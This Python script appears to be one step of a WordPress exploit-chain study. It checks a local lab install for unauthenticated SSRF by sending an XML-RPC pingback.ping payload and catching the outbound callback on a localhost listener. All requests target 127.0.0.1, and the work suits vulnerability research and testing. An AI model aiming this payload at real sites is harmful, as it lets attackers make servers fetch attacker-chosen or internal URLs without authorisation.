#!/usr/bin/env python3
"""
Chain Link 3: Validate pre-auth SSRF via XML-RPC pingback.ping
Tests if WordPress makes an outbound HTTP request to attacker-controlled URL.

This is a SAFE test -- we use a local HTTP listener to detect the callback.
"""

import socket
import threading
import time
import json
import sys
import http.client
from datetime import datetime

WP_URL = "http://127.0.0.1/wp-lab"
LISTENER_PORT = 9876
LISTENER_HOST = "127.0.0.1"

def start_listener(result_holder):
    """Start a simple HTTP listener to detect the SSRF callback."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(10)
    try:
        sock.bind((LISTENER_HOST, LISTENER_PORT))
        sock.listen(1)
        result_holder["listener_started"] = True

        conn, addr = sock.accept()
        data = conn.recv(4096).decode("utf-8", errors="replace")
        result_holder["callback_received"] = True
        result_holder["callback_data"] = data[:500]
        result_holder["callback_from"] = f"{addr[0]}:{addr[1]}"

        # Extract User-Agent and other headers
        for line in data.split("\r\n"):
            if line.lower().startswith("user-agent:"):
                result_holder["user_agent"] = line.split(":", 1)[1].strip()
            if line.lower().startswith("host:"):
                result_holder["request_host"] = line.split(":", 1)[1].strip()

        # Send back a minimal HTML response with a link to the target
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Connection: close\r\n\r\n"
            f'<html><body><a href="{WP_URL}/?p=1">Link</a></body></html>'
        )
        conn.send(response.encode())
        conn.close()
    except socket.timeout:
        result_holder["callback_received"] = False
        result_holder["timeout"] = True
    except Exception as e:
        result_holder["error"] = str(e)
    finally:
        sock.close()


def send_pingback(source_url, target_url):
    """Send an XML-RPC pingback.ping request."""
    xml_payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{source_url}</string></value></param>
    <param><value><string>{target_url}</string></value></param>
  </params>
</methodCall>"""

    conn = http.client.HTTPConnection("127.0.0.1", 80)
    conn.request("POST", "/wp-lab/xmlrpc.php",
                 body=xml_payload,
                 headers={"Content-Type": "text/xml"})
    response = conn.getresponse()
    return {
        "status": response.status,
        "body": response.read().decode("utf-8", errors="replace")[:500]
    }


def main():
    results = {
        "test": "ssrf_pingback_validation",
        "timestamp": datetime.now().isoformat(),
        "wp_url": WP_URL,
        "findings": []
    }

    # First, create a post to pingback against
    # We need a valid target URL -- use the sample page
    target_url = f"{WP_URL}/?page_id=2"  # Default "Sample Page"

    # Test 1: Basic SSRF -- does WordPress fetch our URL?
    print("[*] Starting listener on port", LISTENER_PORT)
    listener_result = {
        "listener_started": False,
        "callback_received": False,
    }

    listener_thread = threading.Thread(target=start_listener, args=(listener_result,))
    listener_thread.daemon = True
    listener_thread.start()

    time.sleep(0.5)  # Wait for listener to start

    if not listener_result.get("listener_started"):
        results["findings"].append({
            "test": "listener_start",
            "status": "FAILED",
            "detail": "Could not start listener"
        })
        print(json.dumps(results, indent=2))
        return results

    print(f"[*] Sending pingback: source=http://{LISTENER_HOST}:{LISTENER_PORT}/test -> target={target_url}")
    source_url = f"http://{LISTENER_HOST}:{LISTENER_PORT}/ssrf-test"

    xmlrpc_response = send_pingback(source_url, target_url)
    results["xmlrpc_response"] = xmlrpc_response

    # Wait for callback
    listener_thread.join(timeout=12)

    results["findings"].append({
        "test": "ssrf_callback",
        "callback_received": listener_result.get("callback_received", False),
        "callback_from": listener_result.get("callback_from"),
        "user_agent": listener_result.get("user_agent"),
        "request_host": listener_result.get("request_host"),
        "status": "CONFIRMED" if listener_result.get("callback_received") else "NOT_RECEIVED",
    })

    if listener_result.get("callback_received"):
        results["findings"].append({
            "test": "ssrf_user_agent_analysis",
            "user_agent": listener_result.get("user_agent", ""),
            "is_wordpress": "WordPress" in listener_result.get("user_agent", ""),
            "detail": "WordPress made an outbound HTTP request to attacker-controlled URL via pingback"
        })

    # Test 2: Check if XMLRPC is enabled (it should be by default)
    check_xml = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
    conn = http.client.HTTPConnection("127.0.0.1", 80)
    conn.request("POST", "/wp-lab/xmlrpc.php", body=check_xml, headers={"Content-Type": "text/xml"})
    resp = conn.getresponse()
    body = resp.read().decode()

    has_pingback = "pingback.ping" in body
    results["findings"].append({
        "test": "xmlrpc_pingback_enabled",
        "status": "ENABLED" if has_pingback else "DISABLED",
        "detail": "pingback.ping method available via XML-RPC"
    })

    # Summary
    ssrf_confirmed = listener_result.get("callback_received", False)
    results["vulnerable"] = ssrf_confirmed
    results["summary"] = (
        "Pre-auth SSRF via XML-RPC pingback.ping: "
        + ("CONFIRMED" if ssrf_confirmed else "NOT CONFIRMED")
        + ". WordPress fetches attacker-controlled URLs without authentication."
    )

    output = json.dumps(results, indent=2)
    print(output)

    with open("/home/[REDACTED]/Desktop/SecSoft/wp-rce-research/evidence/03_ssrf.json", "w") as f:
        f.write(output)

    return results

if __name__ == "__main__":
    results = main()
    sys.exit(0 if results.get("vulnerable") else 1)
